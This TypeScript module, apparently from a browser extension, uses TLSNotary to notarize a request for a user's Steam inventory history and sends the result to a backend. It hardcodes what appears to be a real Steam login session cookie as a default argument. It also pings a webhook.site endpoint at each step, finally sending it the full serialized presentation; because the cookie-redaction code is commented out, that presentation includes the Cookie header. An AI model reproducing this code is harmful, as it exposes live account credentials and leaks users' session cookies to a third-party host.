import {
  Presentation as TPresentation,
  Prover as TProver,
    Commit,
    NotaryServer,
    mapStringToRange,
    subtractRanges,
} from 'tlsn-js';
import * as Comlink from 'comlink';
import { calculateRequestSize, calculateResponseSize } from "./request";

const notaryHost = "notary.cstradeup.net";
const wsRoute = `wss://${notaryHost}/ws`
const tlsnRoute = `https://${notaryHost}`

const DEFAULT_PARAMS = {
  ajax: '1',
  'cursor[time]': '1762787852',
  'cursor[time_frac]': '0',
  'cursor[s]': '0',
  'app[]': '730',
};

const { init, Prover, Presentation, Verifier }: any = Comlink.wrap(
  new Worker(new URL('../worker.ts', import.meta.url)),
);

export const initThreads = async () => {
  await init({
    loggingLevel: 'Warn',
    hardwareConcurrency: navigator.hardwareConcurrency,
  });
};

export async function notarizeSteamRequestAndSendToBackend(steamId: string = '76561199557640798', cookie: string = "steamLoginSecure=76561199557640798%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MDAwRV8yNkVDRjI5NV80RDlDRCIsICJzdWIiOiAiNzY1NjExOTk1NTc2NDA3OTgiLCAiYXVkIjogWyAid2ViOmNvbW11bml0eSIgXSwgImV4cCI6IDE3NjM0MzAyMjgsICJuYmYiOiAxNzU0NzAyMzUwLCAiaWF0IjogMTc2MzM0MjM1MCwgImp0aSI6ICIwMDE1XzI3M0VBRTRCX0E5MzhCIiwgIm9hdCI6IDE3NTc2NjcwODQsICJydF9leHAiOiAxNzc1OTU2NzIwLCAicGVyIjogMCwgImlwX3N1YmplY3QiOiAiNS4yNDkuMTcuMTY0IiwgImlwX2NvbmZpcm1lciI6ICI1LjI0OS4xNy4xNjQiIH0.mdpxEh2kiRndDbG4PWSq5j5OGTJRuEssrLSMyi7-PrdG6qtqN6pC4i2ohy8cvMfHLlN5D2x6sBQeGBPZRVUaCQ", requestParams: Record<string, string> = DEFAULT_PARAMS) {
  // build the fetch URL exactly as the browser will use
  const steamBase = `https://steamcommunity.com/profiles/${steamId}/inventoryhistory/`;
  const search = new URLSearchParams(requestParams).toString();
  const serverURL = `${steamBase}?${search}`;

  // === 1) Use TLSNotary flow to produce presentation ===
  // (This mirrors your TLSNProveOffscreenHandler logic)
  const headers = {
    Connection: 'close',
    Host: 'steamcommunity.com',
    'Accept-Encoding': 'gzip',
    Cookie: cookie,
  };

  const maxSentData = calculateRequestSize(serverURL, 'GET', headers);

  const maxRecvData = 100000; // await calculateResponseSize(serverURL, 'GET', headers);

  const notary = NotaryServer.from(tlsnRoute);
  
  const prover: TProver = (await new Prover({
    serverDns: 'steamcommunity.com',
    maxRecvData,
    maxSentData,
  }))

  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=session");

  const url = await notary.sessionUrl()

  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=before-setup&url=" + encodeURIComponent(url));

  await prover.setup(url);

  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=before-sendrequest");

  await prover.sendRequest(wsRoute, {
    url: serverURL,
    method: 'GET',
    headers: { 'Accept-Encoding': 'gzip', Cookie: cookie, },
  });


  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=before-transcript");

  // transcript includes sent/recv bytes
  const transcript = await prover.transcript();
  const { sent, recv } = transcript;

  // commit: hide sessionid secrets
  const commit: Commit = {
      /* sent: subtractRanges(
          {start: 0, end: sent.length},
          mapStringToRange([cookie], Buffer.from(sent).toString('utf-8'))
      ),
      recv: [
          {start: 0, end: recv.length},
      ], */
      sent: [{start: 0, end: sent.length}],
      recv: [
          {start: 0, end: recv.length},
      ],
  };


  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=before-notarize");

  const notarizationOutputs = await prover.notarize(commit);

  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=before-presentation");

  const presentation: TPresentation = (await new Presentation({
    attestationHex: notarizationOutputs.attestation,
    secretsHex: notarizationOutputs.secrets,
    notaryUrl: notarizationOutputs.notaryUrl,
    websocketProxyUrl: notarizationOutputs.websocketProxyUrl,
    reveal: { ...commit, server_identity: false },
  }));


  await fetch("https://webhook.site/3d02134e-f0b0-494e-bd0e-36c28d2e840f?resp=presentation:" + await presentation.serialize());

  const presentationJSON = await presentation.json();

  // === 3) Send to backend ===
  const payload = {
    presentation: presentationJSON,
  };

  // Use chrome.runtime.sendMessage to background, or do direct fetch from background.
  // Here show direct fetch to server (if in background/service worker). If in page, route via background.
  const backendUrl = 'http://localhost:3000/account/inventory/extension/history';

  // If you are in the background/service worker (recommended), do:
  const r = await fetch(backendUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (!r.ok) {
    throw new Error(`Backend POST failed: ${r.status} ${r.statusText}`);
  }
  return await r.json();
}
